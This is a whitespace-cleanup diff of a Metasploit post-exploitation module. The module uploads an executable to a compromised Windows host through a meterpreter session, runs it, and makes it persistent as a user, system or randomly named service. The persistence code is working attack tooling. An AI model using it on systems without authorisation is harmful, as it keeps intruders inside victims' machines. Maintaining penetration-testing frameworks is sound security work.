@@ -25,15 +25,15 @@ class MetasploitModule < Msf::Post
             'Name'          => 'Windows Manage Persistent EXE Payload Installer',
             'Description'   => %q{
                 This Module will upload a executable to a remote host and make it Persistent.
-                It can be installed as USER, SYSTEM, or SERVICE. USER will start on user login, 
-                SYSTEM will start on system boot but requires privs. SERVICE will create a new service 
-                which will start the payload. Again requires privs. 
+                It can be installed as USER, SYSTEM, or SERVICE. USER will start on user login,
+                SYSTEM will start on system boot but requires privs. SERVICE will create a new service
+                which will start the payload. Again requires privs.
                                  },
             'License'       => MSF_LICENSE,
             'Author'        => [ 'Merlyn drforbin Cousins <drforbin6[at]gmail.com>' ],
             'Version'       => '$Revision:1$',
             'Platform'      => [ 'windows' ],
-	    'SessionTypes'  => [ 'meterpreter']
+            'SessionTypes'  => [ 'meterpreter']
         ))
 
     register_options(
@@ -56,24 +56,24 @@ class MetasploitModule < Msf::Post
         rexename = datastore['REXENAME']
         host,port = session.tunnel_peer.split(':')
         @clean_up_rc = ""
-		
+
 
         if datastore['REXE'] == nil
             print_error ("REXE is null...please define")
             return
         end
-			
+
         if not ::File.exist?(datastore['REXE'])
             print_error ("REXE file does not exist!")
             return
         end
-			
-        raw = create_payload_from_file (rexe)			
-			
+
+        raw = create_payload_from_file (rexe)
+
 
         # Write script to %TEMP% on target
-        script_on_target = write_exe_to_target(raw,rexename) 
- 
+        script_on_target = write_exe_to_target(raw,rexename)
+
 
         # Initial execution of script
         target_exec(script_on_target)
@@ -131,7 +131,7 @@ class MetasploitModule < Msf::Post
             logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
             return logfile
 
-	end
+end
 
         # Function to execute script on target and return the PID of the process
         #-------------------------------------------------------------------------------
@@ -164,11 +164,11 @@ class MetasploitModule < Msf::Post
         #-------------------------------------------------------------------------------
         def install_as_service(script_on_target)
 
-            if  is_system? or is_admin?  
+            if  is_system? or is_admin?
                 print_status("Installing as service..")
                 nam = Rex::Text.rand_text_alpha(rand(8)+8)
                 print_status("Creating service #{nam}")
-                service_create(nam, nam, "cmd /c \"#{script_on_target}\"") 
+                service_create(nam, nam, "cmd /c \"#{script_on_target}\"")
                 @clean_up_rc << "execute -H -f sc -a \"delete #{nam}\"\n"
                 else
                 print_error("Insufficient privileges to create service")
